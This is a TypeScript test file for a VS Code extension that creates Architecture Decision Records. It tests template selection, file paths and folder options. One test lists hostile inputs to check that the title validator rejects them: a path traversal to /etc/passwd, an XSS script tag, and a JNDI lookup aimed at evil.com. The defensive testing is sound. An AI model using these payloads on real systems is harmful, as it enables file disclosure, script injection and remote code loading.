import * as assert from 'assert';
import * as vscode from 'vscode';
import { createAdr, FileWriter } from '../../command-create';
import { SecurityValidator } from '../../security-validator';

/**
 * Mock FileWriter pour les tests
 */
class MockFileWriter implements FileWriter {
	public writeFileCalled = false;
	public writeFileUri: vscode.Uri | null = null;
	public writeFileContent: Buffer | null = null;
	public shouldThrowError = false;
	public errorMessage = 'Erreur de test';

	async writeFile(uri: vscode.Uri, content: Buffer): Promise<void> {
		this.writeFileCalled = true;
		this.writeFileUri = uri;
		this.writeFileContent = content;
		
		if (this.shouldThrowError) {
			throw new Error(this.errorMessage);
		}
	}
}

suite('Command-Create Test Suite', () => {
	vscode.window.showInformationMessage('Start all create tests.');

	test('createAdr should handle null URI gracefully', async () => {
		// Mock de showOpenDialog pour retourner null
		const originalShowOpenDialog = vscode.window.showOpenDialog;
		vscode.window.showOpenDialog = function() {
			return Promise.resolve(undefined);
		} as typeof vscode.window.showOpenDialog;

		try {
			// Devrait gérer l'erreur sans planter
			await createAdr(null as unknown as vscode.Uri);
			// Si on arrive ici, la fonction a géré l'erreur correctement
			assert(true);
		} catch (error) {
			// L'erreur est attendue et gérée par la fonction
			assert(error instanceof Error);
		} finally {
			// Restaure la fonction originale
			vscode.window.showOpenDialog = originalShowOpenDialog;
		}
	});

	test('createAdr should handle file write error', async () => {
		const mockFileWriter = new MockFileWriter();
		mockFileWriter.shouldThrowError = true;
		mockFileWriter.errorMessage = 'Erreur d\'écriture de fichier';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR Title');
		} as typeof vscode.window.showInputBox;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert.fail('Devrait lever une erreur lors de l\'écriture du fichier');
		} catch (error) {
			assert(error instanceof Error);
			// Vérifie seulement que l'erreur est bien gérée
			assert(mockFileWriter.writeFileCalled, 'Le mock devrait avoir été appelé');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('createAdr should handle null title input', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner null (utilisateur annule)
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve(undefined);
		} as typeof vscode.window.showInputBox;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			// Si on arrive ici, la fonction a géré l'annulation correctement
			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est null');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('createAdr should handle empty title input', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner une chaîne vide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('');
		} as typeof vscode.window.showInputBox;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			// Si on arrive ici, la fonction a géré le titre vide correctement
			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est vide');
		} finally {
			// Restaure la fonction originale
			vscode.window.showInputBox = originalShowInputBox;
		}
	});

	test('SecurityValidator integration should work correctly', () => {
		// Test d'intégration avec SecurityValidator
		assert.strictEqual(SecurityValidator.validateAdrTitle('Valid Title'), true);
		assert.strictEqual(SecurityValidator.validateAdrTitle(''), false);
		assert.strictEqual(SecurityValidator.validateAdrTitle('Invalid<>Title'), false);
	});

	test('Input validation should reject malicious input', () => {
		// Test de validation d'entrées malveillantes
		const maliciousInputs = [
			'../../../etc/passwd',
			'<script>alert("xss")</script>',
			'${jndi:ldap://evil.com/exploit}',
			'../../../../../../../../../../../../etc/passwd'
		];

		maliciousInputs.forEach(input => {
			assert.strictEqual(SecurityValidator.validateAdrTitle(input), false, 
				`L'entrée malveillante "${input}" devrait être rejetée`);
		});
	});

	test('FileWriter interface should work correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		const testUri = vscode.Uri.file('test/file.md');
		const testContent = Buffer.from('test content');

		await mockFileWriter.writeFile(testUri, testContent);

		assert.strictEqual(mockFileWriter.writeFileCalled, true);
		assert.strictEqual(mockFileWriter.writeFileUri, testUri);
		assert.strictEqual(mockFileWriter.writeFileContent, testContent);
	});

	test('MADR template should be selected correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test MADR ADR');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration pour utiliser le template MADR
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'currentTemplate') {
						return 'madrTemplateEnglish';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			
			// Vérifier que le contenu contient les éléments spécifiques au template MADR
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('---'), 'Le template MADR devrait contenir des métadonnées YAML');
			assert(content.includes('title:'), 'Le template MADR devrait contenir le champ title');
			assert(content.includes('status:'), 'Le template MADR devrait contenir le champ status');
			assert(content.includes('decision-makers:'), 'Le template MADR devrait contenir le champ decision-makers');
			assert(content.includes('## Context and Problem Statement'), 'Le template MADR devrait contenir la section Context and Problem Statement');
			assert(content.includes('## Decision Drivers'), 'Le template MADR devrait contenir la section Decision Drivers');
			assert(content.includes('## Considered Options'), 'Le template MADR devrait contenir la section Considered Options');
			assert(content.includes('## Decision Outcome'), 'Le template MADR devrait contenir la section Decision Outcome');
			assert(content.includes('## Pros and Cons of the Options'), 'Le template MADR devrait contenir la section Pros and Cons of the Options');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Template selection should handle unknown template gracefully', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Unknown Template');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration pour utiliser un template inconnu
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'currentTemplate') {
						return 'unknownTemplate';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec un template inconnu');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			
			// Vérifier que le contenu contient les éléments du template français par défaut (fallback)
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('* **Statut**'), 'Le fallback devrait utiliser le template français');
			assert(content.includes('## Contexte et Problématique'), 'Le fallback devrait contenir la section Contexte');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Template selection should use centralized mapping for all templates', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Template Mapping');
		} as typeof vscode.window.showInputBox;

		// Test tous les templates disponibles
		const templates = [
			'defaultTemplateFrench',
			'defaultTemplateEnglish', 
			'madrTemplateEnglish',
			'madrTemplateFrench'
		];

		for (const templateName of templates) {
			// Mock de la configuration pour utiliser le template en cours de test
			const originalGetConfiguration = vscode.workspace.getConfiguration;
			vscode.workspace.getConfiguration = function() {
				return {
					get: function(key: string, defaultValue?: unknown) {
						if (key === 'currentTemplate') {
							return templateName;
						}
						if (key === 'adrFilePrefix') {
							return 'adr_';
						}
						if (key === 'adrDirectoryName') {
							return 'adr';
						}
						return defaultValue;
					}
				} as vscode.WorkspaceConfiguration;
			} as typeof vscode.workspace.getConfiguration;

			try {
				const testUri = vscode.Uri.file('test/path/adr');
				await createAdr(testUri, mockFileWriter);
				
				assert(mockFileWriter.writeFileCalled, `Le fichier devrait être écrit avec le template ${templateName}`);
				assert(mockFileWriter.writeFileContent, `Le contenu devrait être écrit avec le template ${templateName}`);
				
				// Vérifier que le bon template a été sélectionné selon le type
				const content = mockFileWriter.writeFileContent!.toString();
				
				if (templateName.includes('madr')) {
					// Templates MADR
					assert(content.includes('---'), `Le template ${templateName} devrait contenir des métadonnées YAML`);
					assert(content.includes('title:'), `Le template ${templateName} devrait contenir le champ title`);
					assert(content.includes('status:'), `Le template ${templateName} devrait contenir le champ status`);
				} else {
					// Templates par défaut
					assert(content.includes('* **'), `Le template ${templateName} devrait contenir des métadonnées en format liste`);
					assert(content.includes('## '), `Le template ${templateName} devrait contenir des sections`);
				}
				
				// Reset pour le prochain test
				mockFileWriter.writeFileCalled = false;
				mockFileWriter.writeFileContent = null;
				
			} finally {
				// Restaure la fonction originale
				vscode.workspace.getConfiguration = originalGetConfiguration;
			}
		}
		
		// Restaure la fonction originale
		vscode.window.showInputBox = originalShowInputBox;
	});

	test('Should warn user if template is unknown and fallback to default', async () => {
		const mockFileWriter = new MockFileWriter();
		let warningMessage = '';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Unknown Template');
		} as typeof vscode.window.showInputBox;

		// Mock de showWarningMessage pour capturer le message
		const originalShowWarningMessage = vscode.window.showWarningMessage;
		vscode.window.showWarningMessage = function(msg: string) {
			warningMessage = msg;
			return Promise.resolve('OK');
		} as typeof vscode.window.showWarningMessage;

		// Mock de la configuration pour utiliser un template inconnu
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'currentTemplate') {
						return 'unknownTemplate';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec un template inconnu');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			assert(warningMessage.includes('inconnu'), 'Un message d\'avertissement doit être affiché si le template est inconnu');
			const content = mockFileWriter.writeFileContent!.toString();
			assert(content.includes('* **Statut**'), 'Le fallback doit utiliser le template français par défaut');
		} finally {
			vscode.window.showInputBox = originalShowInputBox;
			vscode.window.showWarningMessage = originalShowWarningMessage;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should use custom template file if customTemplatePath is set', async () => {
		const mockFileWriter = new MockFileWriter();
		const customTemplateContent = 'CUSTOM TEMPLATE CONTENT';
		let fileReadPath = '';

		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Custom Template');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration pour utiliser un chemin personnalisé
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'currentTemplate') {
						return 'defaultTemplateFrench'; // peu importe, custom doit primer
					}
					if (key === 'customTemplatePath') {
						return '/tmp/custom-template.md';
					}
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		// Mock de la lecture de fichier (fs)
		const fs = await import('fs');
		const originalReadFile = fs.readFileSync;
		fs.readFileSync = function(path: string | number | Buffer) {
			fileReadPath = path.toString();
			return customTemplateContent;
		} as typeof fs.readFileSync;

		try {
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit avec le template personnalisé');
			assert.strictEqual(fileReadPath, '/tmp/custom-template.md', 'Le chemin du template personnalisé doit être utilisé');
			const content = mockFileWriter.writeFileContent!.toString();
			assert.strictEqual(content, customTemplateContent, 'Le contenu du template personnalisé doit être utilisé');
		} finally {
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
			fs.readFileSync = originalReadFile;
		}
	});

	test('Should preview the current ADR template when preview command is called', async () => {
		// Test simplifié de la commande de prévisualisation
		// On teste seulement que la commande peut être exécutée sans erreur
		try {
			await vscode.commands.executeCommand('adrutilities.previewTemplate');
			// Si on arrive ici, la commande s'est exécutée sans erreur
			assert(true);
		} catch (error) {
			// Si la commande n'existe pas encore, c'est normal
			// On teste seulement que l'exécution ne plante pas
			assert(error instanceof Error);
		}
	});

	test('Should handle Windows paths correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Windows Path');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Test avec un chemin Windows simulé
			const testUri = vscode.Uri.file('C:/Users/Test/Project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec un chemin Windows');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être correctement construit');
			
			// Vérifier que l'URI final est valide
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.scheme === 'file', 'L\'URI devrait avoir le schéma file');
			assert(finalUri.fsPath.includes('adr'), 'Le chemin devrait contenir le répertoire adr');
			assert(finalUri.fsPath.endsWith('.md'), 'Le fichier devrait avoir l\'extension .md');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle Windows paths with backslashes correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Windows Backslash Path');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Test avec un chemin Windows avec backslashes
			const testUri = vscode.Uri.file('C:\\Users\\Test\\Project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit même avec des backslashes');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être correctement construit');
			
			// Vérifier que l'URI final est valide
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.scheme === 'file', 'L\'URI devrait avoir le schéma file');
			assert(finalUri.fsPath.includes('adr'), 'Le chemin devrait contenir le répertoire adr');
			assert(finalUri.fsPath.endsWith('.md'), 'Le fichier devrait avoir l\'extension .md');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle real Windows user scenario', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Real Windows User');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Simule un chemin Windows réel d'un utilisateur
			const testUri = vscode.Uri.file('C:/Users/JohnDoe/Documents/MyProject');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			assert(mockFileWriter.writeFileContent, 'Le contenu devrait être écrit');
			
			// Vérifier que le chemin final est correctement formaté pour Windows
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.toLowerCase().includes('c:'), 'Le chemin devrait contenir le lecteur C:.');
			assert(finalUri.fsPath.includes('Users'), 'Le chemin devrait contenir Users');
			assert(finalUri.fsPath.includes('JohnDoe'), 'Le chemin devrait contenir JohnDoe');
			assert(finalUri.fsPath.includes('Documents'), 'Le chemin devrait contenir Documents');
			assert(finalUri.fsPath.includes('MyProject'), 'Le chemin devrait contenir MyProject');
			assert(finalUri.fsPath.includes('adr'), 'Le chemin devrait contenir le répertoire adr');
			assert(finalUri.fsPath.includes('adr_Test_Real_Windows_User'), 'Le chemin devrait contenir le préfixe et le titre');
			assert(finalUri.fsPath.endsWith('.md'), 'Le fichier devrait avoir l\'extension .md');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	// ===== TESTS POUR LA GESTION OPTIONNELLE DES RÉPERTOIRES ADR =====
	// 
	// Ces tests couvrent la nouvelle fonctionnalité adr.autoCreateFolder qui permet
	// de contrôler si un sous-répertoire ADR doit être créé automatiquement.
	//
	// Configuration proposée :
	// {
	//   "adr.autoCreateFolder": {
	//     "type": "boolean",
	//     "default": true,
	//     "description": "Automatically create an 'adr' folder when creating new ADR documents"
	//   }
	// }
	//
	// Scénarios testés :
	// - autoCreateFolder: false → Création directe dans le répertoire courant
	// - autoCreateFolder: true → Création dans le sous-répertoire ADR (comportement actuel)
	// - autoCreateFolder: undefined → Comportement par défaut
	// - Compatibilité Windows/Linux avec les deux modes
	// - Validation des noms de répertoires personnalisés
	// - Gestion des répertoires ADR existants

	test('Should create ADR in current directory when autoCreateFolder is false', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR in Current Directory');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder à false
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return false; // Ne pas créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire courant
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project'), 'Le chemin devrait être dans le répertoire courant :'+ finalUri.fsPath);
			assert(!finalUri.fsPath.includes('/adr/'), 'Le chemin ne devrait pas contenir de sous-répertoire adr :'+ finalUri.fsPath);
			assert(finalUri.fsPath.includes('adr_Test_ADR_in_Current_Directory'), 'Le fichier devrait avoir le bon nom. Obtenu :'+ finalUri.fsPath);
			assert(finalUri.fsPath.endsWith('.md'), 'Le fichier devrait avoir l\'extension .md');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should create ADR in current directory when autoCreateFolder is undefined', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR with Undefined AutoCreate');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder undefined
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return undefined; // autoCreateFolder undefined = comportement par défaut
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire courant
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project'), 'Le chemin devrait être dans le répertoire courant');
			assert(!finalUri.fsPath.includes('/adr/'), 'Le chemin ne devrait pas contenir de sous-répertoire adr');
			assert(finalUri.fsPath.includes('adr_Test_ADR_with_Undefined_AutoCreate'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should still create ADR in adr subdirectory when autoCreateFolder is true', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR with AutoCreate Enabled');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder à true
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return true; // Créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé dans le sous-répertoire adr
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project/adr'), 'Le chemin devrait être dans le sous-répertoire adr :'+ finalUri.fsPath);
			assert(finalUri.fsPath.includes('adr_Test_ADR_with_AutoCreate_Enabled'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should create ADR in current directory when current directory is already an ADR directory and autoCreateFolder is false', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR in Existing ADR Directory');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder à false
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return false; // Ne pas créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Le répertoire courant est déjà un répertoire ADR
			const testUri = vscode.Uri.file('test/path/adr');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire ADR existant
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/adr'), 'Le chemin devrait être dans le répertoire ADR existant');
			assert(!finalUri.fsPath.includes('/adr/adr/'), 'Le chemin ne devrait pas contenir de double répertoire adr');
			assert(finalUri.fsPath.includes('adr_Test_ADR_in_Existing_ADR_Directory'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle Windows paths with autoCreateFolder disabled', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Windows AutoCreate Disabled');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder à false
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return false; // Ne pas créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Simule un chemin Windows avec création directe dans le répertoire courant
			const testUri = vscode.Uri.file('C:/Users/JohnDoe/Documents/MyProject');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire Windows
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.toLowerCase().includes('c:'), 'Le chemin devrait contenir le lecteur C:');
			assert(finalUri.fsPath.includes('Users/JohnDoe/Documents/MyProject'), 'Le chemin devrait être dans le répertoire courant');
			assert(!finalUri.fsPath.includes('/adr/'), 'Le chemin ne devrait pas contenir de sous-répertoire adr');
			assert(finalUri.fsPath.includes('adr_Test_Windows_AutoCreate_Disabled'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle Linux paths with autoCreateFolder disabled', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Linux AutoCreate Disabled');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec autoCreateFolder à false
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return false; // Ne pas créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			// Simule un chemin Linux avec création directe dans le répertoire courant
			const testUri = vscode.Uri.file('/test/johndoe/projects/myproject');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire Linux
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('/test/johndoe/projects/myproject'), 'Le chemin devrait être dans le répertoire courant');
			assert(!finalUri.fsPath.includes('/adr/'), 'Le chemin ne devrait pas contenir de sous-répertoire adr');
